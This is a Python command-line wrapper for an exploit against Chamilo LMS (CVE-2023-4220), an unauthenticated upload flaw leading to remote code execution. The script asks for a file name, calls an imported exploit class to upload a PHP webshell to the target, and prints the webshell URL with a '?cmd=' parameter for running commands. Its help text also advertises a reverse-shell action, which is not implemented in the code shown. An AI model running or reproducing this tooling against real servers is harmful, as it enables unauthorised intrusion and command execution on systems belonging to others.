from argparse import ArgumentParser
from exploit import ChamiloBigUploadExploit
from os import system


def webshell_action() -> None:
    system('clear')
    
    filename = input('Enter the name of the webshell file that will be placed on the target server (default: webshell.php): ')

    if not filename:
        filename = 'webshell.php'

    result = exploit.send_webshell(filename)

    system('clear')

    if result:
        print('[+] Upload successfull [+]')
        print(f'\nWebshell URL: {result}?cmd=<command>')
    else:
        print('[-] Something went wrong [-]')
        print(f'\nUnable to determine whether the file upload was successful. You can check at {url}/main/inc/lib/javascript/bigupload/files/')

actions = {
    'webshell': webshell_action
}

parser = ArgumentParser(
    'Chamilo LMS Unauthenticated Big Upload File RCE',
    'This is a script written in Python that allows the exploitation of the Chamilo\'s LMS software security flaw described in CVE-2023-4220'
)

parser.add_argument('-u', '--url', type=str, required=True, help='Target URL')
parser.add_argument('-a', '--action', type=str, required=True, help='Action to perform on the vulnerable endpoint (webshell: Create PHP webshell file, revshell: Create and execute bash revshell file)')

args = parser.parse_args()

action = args.action
url = args.url.rstrip('/')

exploit = ChamiloBigUploadExploit(url)

actions[action]()